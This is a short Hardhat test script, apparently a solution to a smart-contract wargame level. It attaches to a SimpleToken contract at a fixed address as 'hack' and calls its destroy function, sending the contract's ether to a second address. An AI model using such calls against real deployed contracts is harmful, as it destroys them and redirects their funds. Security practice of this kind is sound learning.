const { expect } = require("chai");
const { ethers } = require("hardhat");

const address = "0xc24B0f707BcFb866c9446af85cBB88C96427D670";

describe("Greeter", function () {
  it("Should return the new greeting once it's changed", async function () {
    const SimpleToken = await ethers.getContractFactory("SimpleToken");
    const hack = await SimpleToken.attach(address);

    const res = await hack.destroy("0x87Fa1091e58bA7D993F63Bb31f6CB08305eCD4e2");
    console.log(res)

  });
});
